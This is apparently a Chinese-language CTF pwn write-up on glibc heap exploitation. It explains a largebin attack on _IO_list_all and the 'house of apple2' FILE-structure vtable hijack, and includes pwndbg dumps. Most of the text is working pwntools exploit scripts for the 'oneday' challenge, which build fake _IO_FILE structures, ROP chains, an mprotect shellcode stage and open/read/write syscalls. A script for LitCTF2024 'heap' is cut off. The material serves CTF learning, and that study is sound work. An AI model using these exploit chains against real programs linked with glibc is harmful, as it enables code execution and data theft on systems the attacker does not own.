#8dele(8)add(3)解释一下，dele(8)是为了先free掉我们的提到的chunk2，，当 malloc 在找合适块时，它会遍历 unsorted 的条目，会优先检查 unsorted bin。如果某个 unsorted 条目正好或可以分割出一个满足请求的小块，malloc 会用它（并把剩下的部分重新插回合适的 bin）。如果某个条目太大/不能直接用来划分，malloc 会把它按大小插入到 largebin（或者 smallbin，视大小而定），以便下次快速匹配，然后add(3)这么大的堆块需要0x1550的大小，而前面的unsorted bin只有0xab0大小，所以malloc会把原来的unsorted bin插入large bin里去，然后从top chunk里分配给新的堆块1234edit(5,data)dele(2)add(3)exit()触发largebin attack之后修改成功了，可以修改chunk8的bk_nextsize为_IO_list_all，，并且chunk2是0x810,于是我们同时将chunk2的size修改，从而伪造一个chunk进行释放，那么想一下，这里触发的largebin attack正好将_IO_list_all修改为这个伪造的chunk，那么我们继续往下写的话，那相当于就是对伪造的_IO_list_all进行填充，那我们就实现了任意控制__IO_list_all了。伪造后的file表结构（这个是修改pointer_guard）123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; p *(struct _IO_FILE_plus*) 0x555555606810$2 = { file = { _flags = 0, _IO_read_ptr = 0xa81 &lt;error: Cannot access memory at address 0xa81&gt;, _IO_read_end = 0x7ffff7df2cc0 &lt;main_arena+96&gt; \"\\220\\222`UUU\", _IO_read_base = 0x7ffff7df2cc0 &lt;main_arena+96&gt; \"\\220\\222`UUU\", _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x555555606910, _fileno = 0, _flags2 = 8, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ffff7df5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7fc4630, //这个是pointer_guard所在的堆地址 _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ffff7df3d20 &lt;_IO_wstrn_jumps&gt;}我们把chain改成了0x910，vtable改成了_IO_wstrn_jumps(跳转到_IO_wstrn_overflow),接着看一下0x910这个fake file结构体123456789101112131415161718192021222324252627282930313233343536373839404142434445pwndbg&gt; p *(struct _IO_cookie_file*) 0x555555606910$4 = { __fp = { file = { _flags = 0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 8, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ffff7df5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ffff7df3b38 &lt;_IO_cookie_jumps+88&gt; }, __cookie = 0x555555606a10, __io_functions = { read = 0x5555456812400000, write = 0x6661616566616164, seek = 0x6661616766616166, close = 0x7ffff7cfd449 &lt;__lockf64+73&gt; }}然后又将rbp的值给rdx，这里就将pointer_guard的值给修改了。而rbp就是f1._wide_data = guard传入的值，这里修改了point_guard的值然后继续执行下一个fake file结构体进行加密操作加密后正好执行我们的gadget后面就开始执行rop链了可以知道为什么target_addr的地址要加0x20，因为经过call qword ptr [rax + 0x18]后，可以直接调用_IO_cookie_read函数拿到flag关于第一个IO结构体的_chain地址为什么是chain = heap_base + 0x17e0 + 0x30 + 0x100，因为第一个large bin距离heapbase的偏移是0x17e0，然后由于分配2个medium大小的chunk后的下一个指向的chunk3，与chunk1的偏移是0x30(0x54-0x24),上文提到过，然后f1与f2的距离有0x100的偏移，所以说___chain的地址就是f2的地址exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225from pwn import *from pwncli import* from ctypes import *pwn = './oneday'libc = ELF(\"./libc.so.6\")if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn) #io = process(['setarch','$(uname -m)','-R','./oneday'])context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"{bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f'%{num}c%{offset}${size}'.encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def set_key(key): sla(b'key &gt;&gt;\\n',str(key))def add(choise): sla(b'command:',b'1') sla(b'choise: ',str(choise))def dele(idx): sla(b'command: \\n',b'2') sla(b'Index: ',str(idx))def edit(idx,commend): sla(b'command:',b'3') sla(b'Index: ',str(idx)) sa(b'Message: \\n',commend)def show(idx): sla(b'command:',b'4') sla(b'Index: ',str(idx)) def exit(): sla(b'command:',b'6') set_key(10)debug(\"call (void)signal(SIGALRM, SIG_IGN)\") add(2) #0add(2) #1add(1) #2dele(2)dele(1)dele(0)add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)show(3)ru(b'Message: \\n')libc_base = uu64() - 0x1f2cc0lg(b'libc_base',libc_base)io.recv(2)heap_base = uu64() - 0x17f0lg(b'heap_base',heap_base)dele(4)dele(6)add(3) #7add(1) #8add(1) #9pause()dele(8)add(3)target_addr = libc_base + libc.sym['_IO_list_all'] lg(b'_IO_list_all',target_addr)_IO_cookie_jumps = libc_base + 0x1f3ae0_IO_wstrn_jumps = libc_base + 0x1f3d20_IO_stdfile_1_lock = libc_base + 0x1f5720__pointer_chk_guard_local = libc_base + 0x3c4630magic = libc_base + 0x146020chain = heap_base + 0x17e0 + 0x30 + 0x100expected = heap_base + 0x17e0 + 0x20 +0x100 mov_rsp_rdx = libc_base + 0x56530add_rsp_0x20_pop_rbx = libc_base + 0xfd449pop_rdi = libc_base + 0x2daa2pop_rsi = libc_base + 0x37c0apop_rdx_rbx = libc_base + 0x87729 f1 = IO_FILE_plus_struct()f1._IO_read_ptr = 0xa81f1.chain = chainf1._flags2 = 8f1._lock = _IO_stdfile_1_lockf1._mode = 0f1._wide_data = __pointer_chk_guard_localf1.vtable = _IO_wstrn_jumpsf2 = IO_FILE_plus_struct()f2._IO_write_base = 0f2._IO_write_ptr = 1f2._mode = 0f2._lock = _IO_stdfile_1_lockf2._flags2 = 8f2.vtable = _IO_cookie_jumps +0x58data = flat( { 0x8: target_addr-0x20, 0x10: { 0:{ 0:bytes(f1), 0x100:{ 0:bytes(f2), 0xe0:[chain + 0x100,rol(magic ^ expected,0x11)], 0x100:[ add_rsp_0x20_pop_rbx, chain + 0x100, 0, 0, mov_rsp_rdx, 0, pop_rdi, chain &amp; ~0xfff, pop_rsi, 0x4000, pop_rdx_rbx, 7,0, libc_base + libc.sym[\"mprotect\"], chain + 0x200,#存放orw的rop链的堆地址 ], 0x200:asm(shellcraft.open('./flag',0) +shellcraft.read(3,heap_base,0x100)+shellcraft.write(1,heap_base,0x100)), } }, 0xa80:[0,0xab1] }})f1_addr = heap_base + 0x1810f2_addr = heap_base + 0x1910# x = 0xa + 0x10 = 0x1a# y = 0xa + 0x10 + 0x10 = 0x2a# z = 2 * 0xa + 0x10 = 0x24 #chunk1_addr = f1_addr - 0X10 + 0x24#chunk2_addr = f1_addr - 0X10 + 0x34#chunk3_addr = f1_addr - 0x10 + 0x54 lg(b'f1_addr',f1_addr)lg(b'f2_addr',f2_addr)edit(5,data)dele(2)pause()add(3)exit()inter()house of apple2利用条件使用house of apple2的条件为： 已知heap地址和glibc地址 能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发 能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制利用原理stdin/stdout/stderr这三个_IO_FILE结构体使用的是_IO_file_jumps这个vtable，而当需要调用到vtable里面的函数指针时，会使用宏去调用。以_IO_file_overflow调用为例，glibc中调用的代码片段分析如下12345#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))其中，IO_validate_vtable函数负责检查vtable的合法性，会判断vtable的地址是不是在一个合法的区间。如果vtable的地址不合法，程序将会异常终止。观察struct _IO_wide_data结构体，发现其对应有一个_wide_vtable成员。12345678910111213141516171819202122struct _IO_wide_data{ wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable;};在调用_wide_vtable虚表里面的函数时，同样是使用宏去调用，仍然以vtable-&gt;_overflow调用为例，所用到的宏依次为：12345678#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable可以看到，在调用_wide_vtable里面的成员函数指针时，没有关于vtable的合法性检查。因此，我们可以劫持IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可控的堆地址空间，进而控制_wide_data-&gt;_wide_vtable为可控的堆地址空间。控制程序执行IO流函数调用，最终调用到_IO_Wxxxxx函数即可控制程序的执行流。利用思路目前在glibc源码中搜索到的_IO_WXXXXX系列函数的调用只有_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE和_IO_WOVERFLOW。其中_IO_WSETBUF和_IO_WUNDERFLOW目前无法利用或利用困难，其余的均可构造合适的_IO_FILE进行利用。这里给出我总结的几条比较好利用的链。以下使用fp指代_IO_FILE结构体变量。利用_IO_wfile_overflow函数控制程序执行流对fp的设置如下： _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格 vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A _wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0 _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0 _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C函数的调用链如下：1234_IO_wfile_overflow _IO_wdoallocbuf _IO_WDOALLOCATE *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)详细分析如下：首先看_IO_wfile_overflow函数1234567891011121314151617181920wint_t_IO_wfile_overflow (FILE *f, wint_t wch){ if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ { f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return WEOF; } /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0) { /* Allocate a buffer if needed. */ if (f-&gt;_wide_data-&gt;_IO_write_base == 0) { _IO_wdoallocbuf (f);// 需要走到这里 // ...... } }}需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0然后看_IO_wdoallocbuf函数：123456789101112void_IO_wdoallocbuf (FILE *fp){ if (fp-&gt;_wide_data-&gt;_IO_buf_base) return; if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED)) if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用 return; _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);}libc_hidden_def (_IO_wdoallocbuf)需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。利用_IO_wfile_underflow_mmap函数控制程序执行流对fp的设置如下： _flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格 vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可 _IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10) _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A _wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8) _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0 _wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0 _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C函数的调用链如下：1234_IO_wfile_underflow_mmap _IO_wdoallocbuf _IO_WDOALLOCATE *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)详细分析如下：看_IO_wfile_underflow_mmap函数：12345678910111213141516171819202122232425262728293031323334353637383940static wint_t_IO_wfile_underflow_mmap (FILE *fp){ struct _IO_codecvt *cd; const char *read_stop; if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS)) { fp-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return WEOF; } if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end) return *fp-&gt;_wide_data-&gt;_IO_read_ptr; cd = fp-&gt;_codecvt; /* Maybe there is something left in the external buffer. */ if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end /* No. But maybe the read buffer is not fully set up. */ &amp;&amp; _IO_file_underflow_mmap (fp) == EOF) /* Nothing available. _IO_file_underflow_mmap has set the EOF or error flags as appropriate. */ return WEOF; /* There is more in the external. Convert it. */ read_stop = (const char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL) { /* Maybe we already have a push back pointer. */ if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL) { free (fp-&gt;_wide_data-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; } _IO_wdoallocbuf (fp);// 需要走到这里 } //......}需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。利用_IO_wdefault_xsgetn函数控制程序执行流这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0。如果不满足这个条件，可选用其他链。对fp的设置如下： _flags设置为0x800 vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可 _mode设置为大于0，即满足*(fp + 0xc0) &gt; 0 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A _wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18) _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C函数的调用链如下：12345_IO_wdefault_xsgetn __wunderflow _IO_switch_to_wget_mode _IO_WOVERFLOW *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)详细分析如下：首先看_IO_wdefault_xsgetn函数：12345678910111213141516171819202122232425262728293031323334353637size_t_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n){ size_t more = n; wchar_t *s = (wchar_t*) data; for (;;) { /* Data available. */ ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end - fp-&gt;_wide_data-&gt;_IO_read_ptr); if (count &gt; 0) { if ((size_t) count &gt; more) count = more; if (count &gt; 20) { s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count); fp-&gt;_wide_data-&gt;_IO_read_ptr += count; } else if (count &lt;= 0) count = 0; else { wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr; int i = (int) count; while (--i &gt;= 0) *s++ = *p++; fp-&gt;_wide_data-&gt;_IO_read_ptr = p; } more -= count; } if (more == 0 || __wunderflow (fp) == WEOF) break; } return n - more;}libc_hidden_def (_IO_wdefault_xsgetn)由于more是第三个参数，所以不能为0。直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。随后当more != 0时会进入__wunderflow。接着看__wunderflow：12345678910111213wint_t__wunderflow (FILE *fp){ if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1)) return WEOF; if (fp-&gt;_mode == 0) _IO_fwide (fp, 1); if (_IO_in_put_mode (fp)) if (_IO_switch_to_wget_mode (fp) == EOF) return WEOF; // ......}要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。然后在_IO_switch_to_wget_mode函数中：12345678int_IO_switch_to_wget_mode (FILE *fp){ if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里 return EOF; // .....}当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。例题分析onedayhouse of apple2解法前文有结构体内容，是利用_IO_wfile_overflow函数控制程序执行流exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232from pwn import *from ctypes import *pwn = './oneday'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def set_key(key): sla(b'key &gt;&gt;\\n',str(key))def add(choise): sla(b'command:',b'1') sla(b'choise: ',str(choise))def dele(idx): sla(b'command: \\n',b'2') sla(b'Index: ',str(idx))def edit(idx,commend): sla(b'command:',b'3') sla(b'Index: ',str(idx)) sa(b'Message: \\n',commend)def show(idx): sla(b'command:',b'4') sla(b'Index: ',str(idx)) def exit(): sla(b'command:',b'6') set_key(10)add(2) #0add(2) #1add(1) #2dele(2)dele(1)dele(0)add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)show(3)ru(b'Message: \\n')libc_base = uu64() - 0x1f2cc0lg(b'libc_base',libc_base)io.recv(2)heap_base = uu64() - 0x17f0lg(b'heap_base',heap_base)dele(4)dele(6)add(3) #7add(1) #8add(1) #9pause()dele(8)add(3)target_addr = libc_base + libc.sym['_IO_list_all'] lg(b'_IO_list_all',target_addr)_IO_wstrn_jumps = libc_base + libc.sym['_IO_wstrn_jumps']_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']_IO_stdfile_1_lock = libc_base + 0x1f5720f1 = FileStructure()f1._IO_read_ptr = 0xa81f1.flags = p64(heap_base + 0x2000)f1._IO_save_base = p64(heap_base+0x1a00)f1._lock = _IO_stdfile_1_lockfake_IO_FILE = heap_base + 0x1810f1._wide_data = fake_IO_FILE + 0xe0f1.vtable = _IO_wfile_jumpssetcontext = libc_base + libc.sym['setcontext']pop_rdi = libc_base + 0x2daa2ret = pop_rdi+1pop_rax = libc_base + 0x446c0pop_rsi = libc_base + 0x37c0apop_rdx_rbx = libc_base + 0x87729 syscall = libc_base + 0x883b6magic_gadget = libc_base + 0x146020magic = libc_base + 0x1482BAlg(b'fake_IO_FILE',fake_IO_FILE)data = flat({ 0x8: target_addr - 0x20, 0x10:{ 0:{ 0:bytes(f1), 0xe0: { 0x18: 0, 0x30: 0, 0xe0: fake_IO_FILE + 0x200, 0x110:0x20, }, 0x200: { 0x0: heap_base + 0x1d00, 0x8: heap_base + 0x1a00, 0x10: setcontext + 61, 0x18: magic_gadget, 0x68: magic, 0x90: heap_base + 0x1d10, #rop链的入口 0x98: ret }, 0x300: { 0x0: 0, 0x8:heap_base+0x300, 0x10: 'flag\\x00\\x00\\x00\\x00', 0x20: setcontext+61 }, 0x500: [ pop_rax, 2, pop_rdi, heap_base + 0x1b20, pop_rsi, 0, syscall, pop_rax, 0, pop_rdi, 3, pop_rsi, heap_base + 0x500, pop_rdx_rbx, 0x40, 0, syscall, pop_rax, 1, pop_rdi, 1, pop_rsi, heap_base + 0x500, pop_rdx_rbx, 0x40, 0, syscall ] }, 0xa80:[0,0xab1] }})debug(\"call (void)signal(SIGALRM, SIG_IGN)\") edit(5,data)dele(2)add(3)exit()inter()LitCTF2024 heap2.35chunk无大小限制的uaf，所以tcache写_IO_list_all，打House of apple即可。网上有很多方法但是哥们学习了这两种直接拿shell的方法1: house of apple2+tcachebin attack123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173from pwn import *from ctypes import *pwn = './heap'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def add(idx,size): sla(b'&gt;&gt;',b'1') sla(b'idx? ',str(idx).encode()) sla(b'size? ',str(size).encode())def dele(idx): sla(b'&gt;&gt;',b'2') sla(b'idx? ',str(idx).encode())def show(idx): sla(b'&gt;&gt;',b'3') sla(b'idx? ',str(idx).encode())def edit(idx,commend): sla(b'&gt;&gt;',b'4') 